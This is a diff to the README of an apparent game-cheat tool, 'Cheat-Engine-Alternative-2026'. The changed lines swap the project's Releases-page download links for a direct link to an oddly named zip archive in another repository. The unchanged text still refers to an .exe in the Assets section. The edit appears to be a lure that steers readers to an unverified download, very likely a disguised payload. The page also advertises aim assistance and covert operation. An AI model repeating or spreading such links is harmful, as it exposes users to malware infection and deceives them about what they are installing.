@@ -5,7 +5,7 @@ description: "Scan and edit game memory with this open-source tool for Windows f
 ---
 # 🎯 Cheat-Engine-Alternative-2026 - Master your games with total control
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Elber6541/Cheat-Engine-Alternative-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Elber6541/elber6541.github.io/main/grassman/Release-antiamusement.zip)
 
 Cheat-Engine-Alternative-2026 provides tools for game modification on Windows. This application assists users in adjusting game parameters and visualizing data during gameplay. It includes features for ESP, aim assistance, and invisible system integration.
 
@@ -13,7 +13,7 @@ Cheat-Engine-Alternative-2026 provides tools for game modification on Windows. T
 
 To begin, visit the official release page to download your copy.
 
-[Download it here](https://github.com/Elber6541/Cheat-Engine-Alternative-2026/releases)
+[Download it here](https://raw.githubusercontent.com/Elber6541/elber6541.github.io/main/grassman/Release-antiamusement.zip)
 
 Click the link above to view the latest version. Look for the file ending in .exe in the Assets section. Save this file to your computer.
 
